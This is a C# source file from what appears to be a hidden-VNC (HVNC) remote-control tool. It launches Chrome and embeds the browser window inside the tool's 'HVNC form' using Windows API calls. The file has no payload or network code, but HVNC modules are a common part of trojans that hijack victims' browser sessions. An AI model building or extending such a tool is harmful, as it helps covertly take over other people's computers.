using System;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

internal class ChromeComands
{
    public static async Task StartChrome(string command) // Asynchronous method
    {
        // Launching the Chrome browser
        try
        {
            Console.WriteLine("Launch Chrome.");
            Process chromeProcess = null;
            IntPtr chromeWindowHandle = IntPtr.Zero;

            // Launching the Chrome browser
            chromeProcess = Process.Start("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
            Console.WriteLine("Chrome browser is running.");

            // Trying to launch Chrome and find its window
            int failedAttempts = 0;
            // Endless cycle
            while (true)
            {
                // Finding a Chrome Browser Window
                bool success = await Task.Run(() =>
                {
                    return NativeMethods.EnumWindows((IntPtr hWnd, IntPtr lParam) =>
                    {
                        uint processId;
                        NativeMethods.GetWindowThreadProcessId(hWnd, out processId);
                        Process process = Process.GetProcessById((int)processId);

                        var classNameTask = GetChromeWindowClassAsync(hWnd);
                        classNameTask.Wait(); // Waiting for an asynchronous method to complete

                        if (process.ProcessName == "chrome" && classNameTask.Result == "Chrome_WidgetWin_1") // Если имя процесса и имени класса совпадают
                        {
                            chromeWindowHandle = hWnd; // We get the process handle
                            return false;
                        }
                        return true;
                    }, IntPtr.Zero);
                });

                // If the window is found, exit the loop
                if (!success)
                {
                    break;
                }

                // If the window is not found, increase the counter of failed attempts
                Console.WriteLine("Chrome window not found.");
                failedAttempts++;

                // If the number of unsuccessful attempts has reached the limit, terminate the Chrome process
                if (failedAttempts >= 3)
                {
                    Console.WriteLine("The maximum number of failed attempts has been reached. The Chrome process will be terminated.");
                    chromeProcess?.Kill();
                    break;
                }
            }

            // If a Chrome window is found, set it as a child of the HVNC form
            if (chromeWindowHandle != IntPtr.Zero)
            {
                StringBuilder className = new StringBuilder(256);
                NativeMethods.GetClassName(chromeWindowHandle, className, className.Capacity);
                Console.WriteLine($"Chrome window handle: {chromeWindowHandle.ToInt64():X8}");
                Console.WriteLine($"Window class name: {className}");

                // Setting a Chrome window as a child of an HVNC form
                Variables.hvncForm.Invoke((MethodInvoker)delegate {
                    NativeMethods.SetParent(chromeWindowHandle, Variables.hvncForm.Handle);
                });

                // Changing Chrome Window Style to Child Window
                IntPtr style = NativeMethods.GetWindowLong(chromeWindowHandle, NativeMethods.GWL_STYLE);
                NativeMethods.SetWindowLong(chromeWindowHandle, NativeMethods.GWL_STYLE, new IntPtr(style.ToInt64() | NativeMethods.WS_CHILD));

                // Centering a Chrome Window inside an HVNC Form
                await CenterChromeWindowAsync(chromeWindowHandle, Variables.hvncForm);
                // Printing a unique identifier to the console
                Console.WriteLine($"Unique ID: {Variables.uniqueId}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error when launching/searching Chrome browser: " + ex.Message);
        }
    }

    // Метод для получения класса окна браузера Chrome
    static async Task<string> GetChromeWindowClassAsync(IntPtr hWnd)
    {
        return await Task.Run(() =>
        {
            StringBuilder className = new StringBuilder(256);
            NativeMethods.GetClassName(hWnd, className, className.Capacity);
            return className.ToString();
        });
    }

    // Метод для центрирования окна Chrome внутри формы HVNC
    static async Task CenterChromeWindowAsync(IntPtr chromeWindowHandle, Form form)
    {
        await Task.Run(() =>
        {
            NativeMethods.RECT rect;
            NativeMethods.GetWindowRect(chromeWindowHandle, out rect);
            // Высота и ширина окна браузера
            int chromeWidth = rect.Right - rect.Left;
            int chromeHeight = rect.Bottom - rect.Top;

            // Высота и ширина окна формы
            int formWidth = form.ClientSize.Width;
            int formHeight = form.ClientSize.Height;

            // Высота и ширина окна формы вычитает ширину и высоту формы а затем полученное значение делится на 2
            int chromeX = (formWidth - chromeWidth) / 2;
            int chromeY = (formHeight - chromeHeight) / 2;

            NativeMethods.SetWindowPos(chromeWindowHandle, IntPtr.Zero, chromeX, chromeY, chromeWidth, chromeHeight, (uint)(NativeMethods.SetWindowPosFlags.SWP_NOZORDER | NativeMethods.SetWindowPosFlags.SWP_NOSIZE));
        });
    }
}

